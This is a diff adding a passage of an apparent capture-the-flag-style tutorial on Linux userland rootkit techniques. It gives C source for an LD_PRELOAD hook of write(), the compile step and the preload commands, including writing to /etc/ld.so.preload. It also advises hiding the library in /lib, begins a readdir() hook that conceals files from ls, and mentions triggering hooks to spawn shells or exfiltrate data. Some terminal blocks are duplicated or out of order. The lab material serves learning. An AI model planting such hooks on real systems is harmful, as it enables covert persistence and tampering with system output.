@@ -238,3 +238,243 @@ Like always, let's break down the statement to make sure that we understand all 
     malicious.c : The name of our program. 
     -fPIC : Generate position-independent code. (Excellent answer on why this is needed can be found here).
     -shared : Tells the compiler to create a Shared Object which can be linked with other objects to produce an executable.
+    -D_GNU_SOURCE : It is specified to satisfy #ifdef conditions that allow us to use the RTLD_NEXT enum (Yes, this is what I was talking about in Question #2 of Task 4) . Optionally this flag can be replaced by adding #define _GNU_SOURCE.
+    -o : Specify the name of the output executable.
+    malicious.so : Name of output file.
+
+With this done, we should have a malicious.so object file ready to hook a function, just waiting to be pre-loaded!
+
+Pre-Loading Our Shared Object
+
+Now that we have our Shared Object file ready, we need to pre-load it before other shared library objects to successfully hook our function. To do this, we have two methods to do this:
+
+    Using LD_PRELOAD
+    Using /etc/ld.so.preload file
+
+If you have been following along, you know that if both are specified, then the libraries specified by LD_PRELOAD are loaded first Both the methods have their pros and cons depending on the situation, but I personally prefer the latter because we can easily hide the /etc/ld.so.preload file using this very same method (explained in a later Task) and not the dot-before-filename way. Below is the syntax for pre-loading the shared object using each method:
+
+Using LD_PRELOAD:
+
+export LD_PRELOAD=$(pwd)/malicious.so
+
+Using /etc/ld.so.preload:
+
+sudo sh -c "echo $(pwd)/malicious.so > /etc/ld.so.preload"
+
+Note : Both of these commands must be run from the directory containing the shared object file. Ideally, you would want to store them somewhere like /lib or /usr/lib depending on where your system stores the shared library object files so as not to arouse suspicion.
+
+You can verify if your shared object was successfully loaded by doing a simple:
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls
+hello  helloworld.c  malicious.c  malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ sudo sh -c "echo $(pwd)/malicious.so > /etc/ld.so.preload"
+[sudo] password for kali:
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls 
+        linux-vdso.so.1 (0x00007ffca1596000)
+        /home/kali/Downloads/C_hooking/malicious.so (0x00007fa3ea966000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fa3ea926000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa3ea74d000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fa3ea6b1000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa3ea6ab000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fa3ea993000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fa3ea68a000)
+
+[Awesome Explanation about that first linux-gate.so.1 library here]
+
+The important thing to notice is that our malicious shared object is being loaded before the standard shared libraries.
+
+So now the scenario is something like this: The program makes a call to the write() function with all the parameters in place. However, instead of going to the libc definition of write() it goes to our malicious shared object as the dynamic linker finds the FIRST OCCURRENCE of write() and lets it do its thing, which in our case is a simple comparison operation which, if true, returns the malicious/tampered output, else passes on the parameters onto the real function inside libc and passes the output obtained back to the program.
+
+Pretty straight forward, right ? This process is roughly similar to the PATH Hijacking method which is widely used during CTFs and Pentests, so if you understand that well, this should be a breeze for you.
+
+ Finally,  we can move to our final stage, which is seeing our malicious shared object in action!
+
+Seeing It In Action
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ./hello    
+Hello World
+Hacked 1337 
+
+└─# su kali
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls
+hello  helloworld.c  malicious.c  malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat malicious.c
+#include <stdio.h>
+#include <unistd.h>
+#include <dlfcn.h>
+#include <string.h>
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); 
+     ssize_t result;
+     new_write = dlsym(RTLD_NEXT, "write");
+     if (strncmp(buf, "Hello World",strlen("Hello World")) == 0)
+     {
+          result = new_write(fildes, "Hacked 1337", strlen("Hacked 1337"));
+     }
+     else
+     {
+          result = new_write(fildes, buf, nbytes);
+     }
+     return result;
+}
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls
+hello  helloworld.c  malicious.c  malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls    
+        linux-vdso.so.1 (0x00007ffe240ed000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f717992c000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7179753000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007f71796b7000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f71796b1000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f7179994000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f7179690000)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ export LD_PRELOAD=$(pwd)/malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ldd /bin/ls
+        linux-vdso.so.1 (0x00007ffe0e3cf000)
+        /home/kali/Downloads/C_hooking/malicious.so (0x00007fbb64010000)
+        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fbb63fd0000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbb63df7000)
+        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fbb63df1000)
+        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fbb63d55000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007fbb6403d000)
+        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fbb63d34000)
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls         
+hello  helloworld.c  malicious.c  malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat malicious.c
+#include <stdio.h>
+#include <unistd.h>
+#include <dlfcn.h>
+#include <string.h>
+ssize_t write(int fildes, const void *buf, size_t nbytes)
+{
+     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); 
+     ssize_t result;
+     new_write = dlsym(RTLD_NEXT, "write");
+     if (strncmp(buf, "Hello World",strlen("Hello World")) == 0)
+     {
+          result = new_write(fildes, "Hacked 1337", strlen("Hacked 1337"));
+     }
+     else
+     {
+          result = new_write(fildes, buf, nbytes);
+     }
+     return result;
+}
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ls
+hello  helloworld.c  malicious.c  malicious.so
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ ./hello    
+Hello World
+Hacked 1337  
+
+Remember the little "Hello World" Program we created ? Let's re-run it now with our malicious shared object pre-loaded and ready ! If we run it this time we will see something fun. Instead of the "Hello World" string being echoed back, we will see "Hacked 1337", courtesy of our malicious shared object.
+
+But does it stop there? NO. Manyyyyyyyyyyyyy other programs (as obvious by the excess trailing 'y's) use libc to do their work for them. write() is a very common functionality and is frequently invoked. This will affect all such programs.
+
+For example, if you create a file with the text "Hello World" and try to cat it out, we will get "Hacked 1337" as output. Same results will follow if we used python3 to print the same because at some level, they all are using the write() function which has already been hooked. So now you can imagine the wide array of things you can achieve with hooking functions instead of just swapping text.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ echo "Hello World" > test
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ cat test       
+Hacked 1337
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/C_hooking]
+└─$ python3 -c "print('Hello World')"
+Hacked 1337
+              
+Note: Make sure that the string you are replacing and the string you are replacing it with have the same number of characters to prevent memory flaws
+
+So that was all about hooking the write() function. Though we did not play around with the function much, but it is to be noted that this can be used to trigger a lot of other events. For example many services use the write() function to generate logs and if we are able to trigger a switch (for example by passing "Hello World" or some other switch as a username or in the User Agent of a request, which will then be passed as an argument to write() at some point), we can spawn reverse/bind shells, delete files, exfiltrate data, etc.
+
+That being said, we will have a look at some more interesting things we can do with Function Hooking and have fun hooking onto a few more libc functions in the upcoming tasks.
+Answer the questions below
+When compiling our code to produce a Shared Object, which flag is used to create position independent code?
+-fPIC
+
+Can hooking libc functions affect the behavior of Python3? (Yay/Nay)
+Yay
+
+ Hiding Files From ls
+
+Now that we know how to use Shared Objects to hook various functions, let's learn how to hide files from the ls command in a more efficient way than just putting-a-dot-before-filename.
+
+Before we attack the ls  command, we need to understand how it actually works. I will not go into details of the entire thing here (people are getting angry at the long tasks) but here's an excellent resource to understand the command, and it's workings in depth.
+
+The primary thing which we need to know here that the command uses a function called readdir() which returns a pointer to the next dirent structure in the directory. A dirent is a C - structure who's glibc definition can be obtained from the man page of readdir: 
+
+struct dirent {
+     ino_t          d_ino;       /* Inode number */
+     off_t          d_off;       /* Not an offset; see below */
+     unsigned short d_reclen;    /* Length of this record */
+     unsigned char  d_type;      /* Type of file; not supported not supported by all filesystem types */  
+     char           d_name[256]; /* Null-terminated filename */
+     };
+
+The main parameter which we are concerned about here is the d_name[256] which is a mandatory field and contains the name of the various files in our a directory. (See where I am going with this ?)
+
+So here's the roadmap:
+
+    ls uses readdir() function to get the contents of a directory
+    The readdir() function returns a pointer to a dirent structure to the next directory entry
+    The dirent structure contains a d_name parameter which contains the name of the file
+    Thus, we hook the readdir() function
+    Then we pass the parameters to the original function and check whether the d_name parameter of the dirent whose pointer is being returned is equal to a given a filename
+    If yes, we skip it and pass on the rest.
+
+With the map all set, let's get to coding! 
+
+#include <string.h>
+#include <stdlib.h>
+#include <dirent.h>
+#include <dlfcn.h>
+
+#define FILENAME "ld.so.preload"
+
